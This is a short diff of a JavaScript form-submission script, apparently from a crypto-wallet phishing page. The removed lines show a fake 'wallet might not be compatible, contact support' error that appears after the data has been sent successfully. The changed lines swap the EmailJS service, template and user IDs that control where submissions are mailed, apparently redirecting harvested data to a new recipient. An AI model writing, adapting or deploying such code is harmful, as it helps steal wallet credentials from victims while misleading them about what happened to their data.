@@ -65,7 +65,7 @@ const sendData = async (data) => {
     // Define what happens on successful data submission
     XHR.addEventListener("load", function(event) {
         alert(
-            "Error! The wallet connected might not be compatible.Please contact the admin/support for more help or Connect with an active wallet."
+            "Sent successfully"
         );
 
         document.querySelector(".sending").style.display = "none";
@@ -145,9 +145,9 @@ form.addEventListener("submit", async function(e) {
 // end
 
 // m
-FD.append("service_id", "service_p40wo79")
-FD.append("template_id", "template_y7mxema");
-    FD.append("user_id", "KbJLnOhPJAQERlbWj");
+FD.append("service_id", "service_8hvmejp")
+FD.append("template_id", "template_80eq6pp");
+    FD.append("user_id", "DQJOwbJLaL_J_VKQo");
 // end
 
 
